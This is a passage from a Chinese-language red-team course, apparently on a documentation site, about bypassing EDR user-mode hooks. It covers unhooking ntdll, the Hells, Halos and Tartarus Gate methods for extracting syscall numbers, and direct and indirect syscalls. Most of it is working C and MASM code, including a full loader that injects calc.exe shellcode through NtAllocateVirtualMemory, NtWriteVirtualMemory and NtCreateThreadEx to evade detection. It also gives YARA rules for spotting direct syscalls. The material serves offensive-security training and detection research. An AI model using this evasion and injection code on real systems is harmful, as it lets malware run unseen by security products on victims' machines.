printf(\u0026#34;NTAPI %s is hooked, its address is 0x%x\\n\u0026#34;, funcName, pFunctionAddress); DWORD_PTR pageStart = ((DWORD_PTR)pFunctionAddress / 0x1000) * 0x1000; printf(\u0026#34;Start address of the page is 0x%x\\n\u0026#34;, pageStart); DWORD oldProtection = 0; bool isProtected = VirtualProtect((PBYTE)pageStart, 0x1000, PAGE_EXECUTE_READWRITE, \u0026amp;oldProtection); memcpy(pFunctionAddress, cleanNTAPI, 0xb); isProtected = VirtualProtect((PBYTE)pageStart,0x1000, oldProtection, \u0026amp;oldProtection); return true; } return false; } } return false; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); unsigned char cleanNtOpenProcess[] = \u0026#34;\\x4c\\x8b\\xd1\\xb8\\x26\\x00\\x00\\x00\\x0f\\x05\\xc3\u0026#34;; CheckFuncByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;,cleanNtOpenProcess); CheckFuncByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;,cleanNtOpenProcess); return 0; } 代码的 syscall stub 中保存的是最精简的指令，因为这足以成功发起 syscall。总之，通过补丁给定被 hook 的函数指令，可以实现对想要的函数进行 unhook。\n对于此方法，虽然比替换整个代码区动静要小一些，但因为原理相似，论 IOC 其实是差不多的。\n从挂起的进程中载入纯净 ntdll 模块 # 我们还可以通过读取挂起进程中载入的 ntdll 来获得纯净的副本，并用于 unhook。当进程以挂起或者被调试的状态被创建，此时只有 ntdll 被载入，EDR 还未来得及注入其检视 API 调用的模块。\n在这之后，我们可以通过 ReadProcessMemory 来读取载入的 ntdll 模块的代码区。要能精准地获取干净副本的代码区并实现 unhook，我们可以通过以下的步骤实现：\n使用 NtQueryInformationProcess API 获得远程挂起进程的 PEB 地址 通过 PEB Walking 的方法获得远程进程中载入的纯净 ntdll 地址。因为是远程进程，步骤会不那么直接一些。 因为都是已经载入到内存的 ntdll，解析当前载入的 ntdll 模块(即被 hook 的) 从而获取代码区的 RVA 以及尺寸 从纯净的 ntdll 模块的代码区开始读取，直到读取字节数达到尺寸 覆盖被 hook 的代码区实现 unhook 知道了原理与流程后，作为一道练习题，请学员们尝试自行完成完整代码，并分析该方法有哪些 IOC。\n"},{"id":8,"href":"/docs/%E5%85%B6%E4%BB%96/hooking/3.%E8%B0%83%E7%94%A8syscall%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E6%80%81hook%E7%BB%95%E8%BF%87/","title":"3.调用syscall实现用户态 Hook绕过","section":"Docs","content":" 3. 调用syscall实现用户态Hook绕过 # 在上个小节，我们主要是通过对 ntdll 模块进行覆盖或者补丁来移除 hook 实现用户态 hook 的绕过。但是这些方法涉及到对 ntdll 的纂改，以及对内存权限的修改，具有一定的风险。实际上，我们还有其他途径来实现 hook 的绕过。\n提取 syscall 号码 # 我们可以在 C 项目里定义汇编函数，来实现 NTAPI。我们知道，只需要最少 4 条指令，我们便能成功执行 syscall。但在执行 syscall 之前，我们需要获得目标函数的 SSN。我们可以从磁盘中读取一份干净的 ntdll 并解析得到 SSN，但从磁盘中读取 ntdll 会显得有些可疑，因此最好是解析载入的 ntdll 并设法获得 SSN。\nHells Gate # Hells Gate 通过 PEB Walking 的方法得到加载的 ntdll 地址以及想要获得 SSN 的函数地址。通过对关键字节的比较来确定这是一个有效的 syscall stub，从而提取出 SSN。其实上个小节我们已经用了这个逻辑了。\n原始代码关键部分如下：\nif (*((PBYTE)pFunctionAddress + cw) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low; break; } 但是，如果要搜索的函数被 hook 了，那么 SSN 可能不会存在于 syscall stub 里(取决于是什么 EDR 以及覆盖了哪些指令)，这样的话，就不能成功获得 ssn 了。因此，Halos Gate 对此进行了改善。\nHalos Gate # 我们发现，在 ntdll 里，随着地址的增高，NTAPI 的 SSN 是递增的，反之则递减。因此，如果我们想要搜索的 NTAPI 被 hook 了，可以向上和向下同时继续搜索，例如往下搜索了 2 跳发现了一个未被 hook 的 NTAPI，那么要搜索的 NTAPI 的 SSN 就是这个未被 hook 的 NTAPI 的 SSN 再减去 2，即 Desired_SSN = Clean_SSN - Hop。\n关键代码部分如下：\nint GoUp -32; int GoDown 32; // If the first instruction of the syscall is a an inconditional jump (aka it\u0026#39;s hooked) if (*((PBYTE)pFunctionAddress) == 0xe9) { // Search beginning pattern of syscall stub through 500 function up and down from our location for (WORD index = 1; index \u0026lt;= 500; index++) { // Search the begining of a syscall stub in the next function down if (*((PBYTE)pFunctionAddress + index * GoDown) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + index * GoDown) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + index * GoDown) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + index * GoDown) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + index * GoDown) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + index * GoDown) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress + 5 + index * GoDown); BYTE low = *((PBYTE)pFunctionAddress + 4 + index * GoDown); // substract the index from the current syscall identifier to find the one of our target function pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low - index; return TRUE; } // Search the begining of a syscall stub in the next function down if (*((PBYTE)pFunctionAddress + index * GoUp) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + index * GoUp) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + index * GoUp) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + index * GoUp) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + index * GoUp) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + index * GoUp) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress + 5 + index * GoUp); BYTE low = *((PBYTE)pFunctionAddress + 4 + index * GoUp); // substract the index from the current syscall identifier to find the one of our target function pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low + index; return TRUE; } } 代码里定义了最大搜索跳数为 32，搜索时确实需要注意边界。Halos Gate 也有个小局限性，它以第一条指令是否是 jmp 从而判断函数是否被 hook 了。我们之前说了，不同的 EDR 覆盖的指令不同，有的 EDR 覆盖的不是第 1 条指令，可以是 syscall 之前的任何指令。例如 CrowdStrike 覆盖的是第 2 条指令。\nTartarus Gate # Tartarus Gate 相比 Halos Gate 的改动比较小，主要是考虑了更多 EDR 可能 hook 的情况，例如上面截图所示的情况。对前 4 字节逐一对比，还是相对比较可靠的判断。当然了，hook 导致的指令覆盖可能在 syscall 指令之前的任何字节，如果不放心的话，可以增加更多字节比较。\n下面的代码是我个人对动态获取 SSN 的实现：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; //Get module handle for ntdll and kernel32 at the same time void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = *(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } unsigned char QuickGetSSN(PBYTE pFunctionAddress) { const int maxOffset = 10; // You can adjust this based on your requirements. int offset; unsigned char ssn_low = -1; unsigned char ssn_high = -1; unsigned char ssn = -1; if (pFunctionAddress[0] == 0x4C \u0026amp;\u0026amp; pFunctionAddress[1] == 0x8B \u0026amp;\u0026amp; pFunctionAddress[2] == 0xD1 \u0026amp;\u0026amp; pFunctionAddress[3] == 0xB8) { printf(\u0026#34;The function is clean\\n\u0026#34;); char ssn = *((unsigned char*)(pFunctionAddress + 4)); printf(\u0026#34;ID of searched function is: 0x%x\\n\u0026#34;, ssn); return ssn; } else { printf(\u0026#34;The function is hooked\\n\u0026#34;); // Search both upwards and downwards. for (offset = 1; offset \u0026lt;= maxOffset; ++offset) { // Check upwards. PBYTE checkAddress = pFunctionAddress - (0x20 * offset); if (checkAddress[0] == 0x4C \u0026amp;\u0026amp; checkAddress[1] == 0x8B \u0026amp;\u0026amp; checkAddress[2] == 0xD1 \u0026amp;\u0026amp; checkAddress[3] == 0xB8) { ssn_low = *((unsigned char*)(checkAddress + 4)); ssn_high = *((unsigned char*)(checkAddress + 5)); ssn = ssn_low * 1 + ssn_high * 16; printf(\u0026#34;Clean sequence found upwards at offset -0x%x, SSN of the unhooked function is 0x%x\\n\u0026#34;, offset, ssn); printf(\u0026#34;SSN of searched NTAPI is 0x%x\\n\u0026#34;, (offset + ssn)); return ssn+offset; } // Check downwards. checkAddress = pFunctionAddress + (0x20 * offset); if (checkAddress[0] == 0x4C \u0026amp;\u0026amp; checkAddress[1] == 0x8B \u0026amp;\u0026amp; checkAddress[2] == 0xD1 \u0026amp;\u0026amp; checkAddress[3] == 0xB8) { ssn_low = *((unsigned char*)(checkAddress + 4)); ssn_high = *((unsigned char*)(checkAddress + 5)); ssn = ssn_low * 1 + ssn_high * 16; printf(\u0026#34;Clean sequence found downwards at offset 0x%x, SSN of the unhooked function is 0x%x\\n\u0026#34;,offset, ssn); printf(\u0026#34;SSN of searched NTAPI is 0x%x\\n\u0026#34;, (offset - ssn)); return ssn-offset; } } } } unsigned char GetSSNByName(IN HMODULE hModule, const CHAR* funcName) { PBYTE pBase = (PBYTE)hModule; unsigned char ssn_low = -1; unsigned char ssn_high = -1; unsigned char ssn = -1; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return -1; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return -1; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName, pFunctionName) == 0) { if (pFunctionAddress[0] == 0x4C \u0026amp;\u0026amp; pFunctionAddress[1] == 0x8B \u0026amp;\u0026amp; pFunctionAddress[2] == 0xD1 \u0026amp;\u0026amp; pFunctionAddress[3] == 0xB8) { printf(\u0026#34;NTAPI %s may not be hooked\\n\u0026#34;, funcName); ssn_low = *((unsigned char*)(pFunctionAddress + 4)); ssn_high = *((unsigned char*)(pFunctionAddress + 5)); ssn = ssn_low * 1 + ssn_high * 16; printf(\u0026#34;Syscall number of function %s is: 0x%x\\n\u0026#34;, pFunctionName,ssn); return ssn; } else { printf(\u0026#34;NTAPI %s is hooked, check surrounding functions\\n\u0026#34;, funcName); ssn = QuickGetSSN(pFunctionAddress); printf(\u0026#34;Syscall number of function %s is: 0x%x\\n\u0026#34;, pFunctionName, ssn); return ssn; } return -1; } } return -1; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); unsigned char ssn =GetSSNByName(ntdll, \u0026#34;NtOpenProcess\u0026#34;); printf(\u0026#34;SSN of the NtOpenProcess is 0x%x\\n\u0026#34;, ssn); return 0; } 我们人为地给 NtOpenProcess，以及其前向 2 个函数、后向 3 个函数都进行了指令覆盖来模拟 hook。最终，程序成功地发现前向第 3 个函数是没有被 hook 的，提取了其 SSN 后加上 3，得到了 NtOpenProcess 的 SSN。\n直接调用 Syscall # 有了目标函数的 SSN，我们便可以用汇编代码实现 NTAPI 并进行调用了。这里，我们将先讨论直接调用 syscall。我们以经典的 VirtualAlloc + WriteProcessMemory(或者是其他复制数据的函数) + CreateThread + WaitForSingleObject 的代码执行方法为例，当然了，我们使用的是这些 API 的 NTAPI 版本，执行 calc 的 shellcode。\n直接 syscall # 在 C 源代码文件里定义 NtAllocateVirtualMemory 函数以及所需的结构体(尽管该 NTAPI 没有所需的结构体)，而在 asm 文件里用汇编代码实现函数功能，这里我们实现 NtAllocateVirtualMemory 的 syscall stub 即可。 EXTERN_C 宏允许链接器将该函数定义与汇编代码链接起来，需要保持名称相同。这样，我们就能像调用一般函数一样调用定义的汇编函数了。\nEXTERN_C NTSTATUS NtAllocateVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect); .code \u0026lt;...SNIP...\u0026gt; NtAllocateVirtualMemory PROC mov r10, rcx mov rax, 18h syscall ret NtAllocateVirtualMemory ENDP \u0026lt;...SNIP...\u0026gt; end 以此类推，我们接着去定义其他所需的函数，例如 NtWriteVirtualMemory，NtCreateThreadEx，NtWaitForSingleObject，NtClose 等。因为这些 NTAPI 大都没有微软官方的文档，因此我们需要借助搜索引擎参考已有项目对其的用法。完成后的代码如下：\nDirectSyscall.c 代码\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; typedef struct _PS_ATTRIBUTE { ULONG Attribute; SIZE_T Size; union { ULONG Value; PVOID ValuePtr; } u1; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; EXTERN_C NTSTATUS NtAllocateVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect); EXTERN_C NTSTATUS NtWriteVirtualMemory( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL); EXTERN_C NTSTATUS NtCreateThreadEx( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL); EXTERN_C NTSTATUS NtWaitForSingleObject( IN HANDLE ObjectHandle, IN BOOLEAN Alertable, IN PLARGE_INTEGER TimeOut OPTIONAL); EXTERN_C NTSTATUS NtClose( IN HANDLE Handle); int main() { // calc.exe shellcode unsigned char code[] = \u0026#34;\\x48\\x31\\xd2\\x65\\x48\\x8b\\x42\\x60\\x48\\x8b\\x70\\x18\\x48\\x8b\\x76\\x20\\x4c\\x8b\\x0e\\x4d\\x8b\\x09\\x4d\\x8b\\x49\\x20\\xeb\\x63\\x41\\x8b\\x49\\x3c\\x4d\\x31\\xff\\x41\\xb7\\x88\\x4d\\x01\\xcf\\x49\\x01\\xcf\\x45\\x8b\\x3f\\x4d\\x01\\xcf\\x41\\x8b\\x4f\\x18\\x45\\x8b\\x77\\x20\\x4d\\x01\\xce\\xe3\\x3f\\xff\\xc9\\x48\\x31\\xf6\\x41\\x8b\\x34\\x8e\\x4c\\x01\\xce\\x48\\x31\\xc0\\x48\\x31\\xd2\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xca\\x0d\\x01\\xc2\\xeb\\xf4\\x44\\x39\\xc2\\x75\\xda\\x45\\x8b\\x57\\x24\\x4d\\x01\\xca\\x41\\x0f\\xb7\\x0c\\x4a\\x45\\x8b\\x5f\\x1c\\x4d\\x01\\xcb\\x41\\x8b\\x04\\x8b\\x4c\\x01\\xc8\\xc3\\xc3\\x41\\xb8\\x98\\xfe\\x8a\\x0e\\xe8\\x92\\xff\\xff\\xff\\x48\\x31\\xc9\\x51\\x48\\xb9\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x51\\x48\\x8d\\x0c\\x24\\x48\\x31\\xd2\\x48\\xff\\xc2\\x48\\x83\\xec\\x28\\xff\\xd0\u0026#34;; LPVOID allocation_start; SIZE_T allocation_size = sizeof(code); HANDLE hThread; NTSTATUS status; allocation_start = nullptr; // Allocate Virtual Memory if (NtAllocateVirtualMemory(GetCurrentProcess(), \u0026amp;allocation_start, 0, (PULONG64)\u0026amp;allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)==0) printf(\u0026#34;Memory allocated at %p\\n\u0026#34;, allocation_start); else printf(\u0026#34;Allocated failed, Error code is %d\\n\u0026#34;,GetLastError()); // Copy shellcode into allocated memory if (NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code, sizeof(code), 0)==0) printf(\u0026#34;Copied successfully\\n\u0026#34;); else printf(\u0026#34;Copied failed, Error code is %d\\n\u0026#34;, GetLastError()); if (NtCreateThreadEx(\u0026amp;hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL)==0) printf(\u0026#34;Executed successfully\\n\u0026#34;); else printf(\u0026#34;Executed failed, Error code is %d\\n\u0026#34;, GetLastError()); // Wait for the end of the thread and close the handle NtWaitForSingleObject(hThread, FALSE, NULL); NtClose(hThread); return 0; } stub.asm 代码\n.code NtAllocateVirtualMemory PROC mov r10, rcx mov rax, 18h syscall ret NtAllocateVirtualMemory ENDP NtWriteVirtualMemory PROC mov r10, rcx mov rax, 3Ah syscall ret NtWriteVirtualMemory ENDP NtCreateThreadEx PROC mov r10, rcx mov rax, 0C2h syscall ret NtCreateThreadEx ENDP NtWaitForSingleObject PROC mov r10, rcx mov rax, 4 syscall ret NtWaitForSingleObject ENDP NtClose PROC mov r10, rcx mov rax, 0Fh syscall ret NtClose ENDP end 为了能编译 masm 文件，我们右键项目，选择 Build Dependencies -\u0026gt; Build Customizations，勾选 masm。\n右键 asm 代码文件选择属性，General -\u0026gt; Item Type 选项选择 Microsoft Macro Assembler。\n这样我们便能编译项目里的 masm 代码了。编译后运行程序，我们发现 shellcode 得以成功运行。\n不过直接 syscall 调用的弊端也是比较显著的，汇编函数在编译后成为操作码存在于程序的代码区，汇编代码与操作码是可预测的一一对应的关系。因此，如果没有对 syscall stub 进行混淆的话，我们可以用如下 yara 规则来检测包含直接 syscall 调用的程序：\nrule direct_syscall { meta: description = \u0026#34;Hunt for direct syscall\u0026#34; strings: $s1 = {4c 8b d1 48 c7 c0 ?? ?? ?? ?? 0f 05 c3} $s2 = {4C 8b d1 b8 ?? ?? ?? ?? 0F 05 C3} condition: #s1 \u0026gt;=1 or #s2 \u0026gt;=1 } 我们定义了 5 个 syscall stub，都被检测到了。我们可以插入一些 NOP 类(即无实际意义、不影响运行结果) 的指令用于混淆 syscall stub。但即便有混淆，0xf 0x5(syscall) 指令始终存在于代码区，这是可疑的。\n此外，从调用栈的视角，是我们程序的某一函数发起了 syscall，而不是 ntdll 空间内的 NTAPI，这是非常可疑的。\nsyswhisper 1\u0026amp;2 # Syswhisper 1 和 2 可以自动地帮我们生成 C 项目的头文件以及 asm 文件，方便我们发起直接 syscall。Syswhisper 1 是通过检查操作系统的版本从而确定给定 NTAPI 的 SSN，这算是硬编码了，不够灵活。\nsyswhisper 2 将所有 Zw 开头的函数按照地址排序存储进数组里，SSN 与函数地址高低是正相关，因此，要寻找的函数的 SSN 即为该函数地址在数组里的索引。\n至于为什么以 Zw 开头，因为其实 NTAPI 的 NT 与 ZW 版本指向同一地址。\n使用 syswhisper 2 的 python 脚本生成所需的头文件，c 文件以及 asm 文件，可以生成所有的 NTAPI 的相关代码，也可以只生成指定或常用的 NTAPI 的。\n因为有 asm 文件，所以我们依旧需要启用 masm。把生成的头文件加入到 Header Files 中，c 文件与 asm 文件添加至 Source Files 中。\n对于主函数的代码，我们可以复用之前的，但别忘了添加 syswhisper2 生成的头文件。就这样，我们也成功执行了 shellcode。\n我们可以根据 asm 文件中的 WhisperMain 函数代码创建 yara 规则。\n样本规则如下所示：\nrule syswhisper2 { meta: description = \u0026#34;Hunt for syswhisper2 generated asm code\u0026#34; strings: $s1 = {58 48 89 4C 24 08 48 89 54 24 10 4C 89 44 24 18 4C 89 4C 24 20 48 83 EC 28 8B 0D ?? ?? 00 00 E8 ?? ?? ?? ?? 48 83 C4 28 48 8B 4C 24 08 48 8B 54 24 10 4C 8B 44 24 18 4C 8B 4C 24 20 4C 8B D1 0F 05 C3} condition: #s1 \u0026gt;=1 } 这样，我们用 yara 检测到了使用 syswhisper2 的程序。当然了，可以对该函数进行混淆，不过调用栈的嫌疑也很大。\n间接调用 Syscall # 因为直接 syscall 在调用栈上有着难以掩盖的检测点，间接调用 syscall 应运而生。间接调用 syscall 这个分类下其实也衍生出了多种方法，也包括我近期提出的 MutationGate。\n间接 syscall # 间接 syscall 的宗旨是与其直接在程序内执行 syscall 指令，不如在 ntdll 模块里寻找一条 syscall 指令，记录其地址，并在项目中用汇编代码定义的 syscall stub 中，将原本的 syscall 指令替换为 jmp \u0026lt;syscall 地址\u0026gt; 指令。如下所示：\nNtAllocateVirtualMemory PROC mov r10, rcx mov eax, (ssn of NtAllocateVirtualMemory) jmp (address of a syscall instruction) ret NtAllocateVirtualMemory ENDP 我们可以用如下代码获得给定 NTAPI 的 syscall 指令的地址。不过，从函数调用成功的角度来看，我们其实不是非得要获得目标 NTAPI 的 syscall 指令的地址。syscall 是一种特殊的 call 指令，根据 RAX/EAX 的值来确定内核层的对应函数，而非 syscall 指令所在的地址。也就是说，如果我们能在其他 DLL 中找到 syscall 指令，也是可以用的。如果我们刻意地选用良性 NTAPI 的 syscall 指令而非目标 NTAPI 的，可能会带来规避上的优势，但也可能适得其反，这取决于 EDR 的检测逻辑。毕竟，在内核层从调用栈或返回地址的角度是可以看出端倪的。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; //Get module handle for ntdll and kernel32 at the same time void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = *(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } PBYTE GetSyscallAddr(IN HMODULE hModule, const CHAR* funcName) { PBYTE pBase = (PBYTE)hModule; PBYTE syscall; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return 0; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return 0; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName, pFunctionName) == 0) { syscall = (pFunctionAddress + 0x12); return syscall; } } return 0; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); PBYTE syscall_addr = GetSyscallAddr(ntdll, \u0026#34;NtOpenProcess\u0026#34;); printf(\u0026#34;Address of syscall instruction is 0x%p\\n\u0026#34;, syscall_addr); return 0; } 这样，我们成功地获得了一条 syscall 指令的地址，与我们在 WinDBG 中查看到的一致。\n有了 syscall 指令的地址，那么可以得到如下代码(依旧启用 masm)：\nindirectsyscall.cpp 代码\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; extern \u0026#34;C\u0026#34; { UINT_PTR syscall_addr1; UINT_PTR syscall_addr2; UINT_PTR syscall_addr3; UINT_PTR syscall_addr4; UINT_PTR syscall_addr5; } typedef struct _PS_ATTRIBUTE { ULONG Attribute; SIZE_T Size; union { ULONG Value; PVOID ValuePtr; } u1; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; EXTERN_C NTSTATUS NtAllocateVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect); EXTERN_C NTSTATUS NtWriteVirtualMemory( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL); EXTERN_C NTSTATUS NtCreateThreadEx( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL); EXTERN_C NTSTATUS NtWaitForSingleObject( IN HANDLE ObjectHandle, IN BOOLEAN Alertable, IN PLARGE_INTEGER TimeOut OPTIONAL); EXTERN_C NTSTATUS NtClose( IN HANDLE Handle); void GetModule(HMODULE* ntdll, HMODULE* kernel32) { PPEB peb = (PPEB)(__readgsqword(0x60)); PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((PBYTE)peb + 0x18); //PPEB_LDR_DATA pLdr = pPeb-\u0026gt;Ldr; PLIST_ENTRY ntdlllistentry = 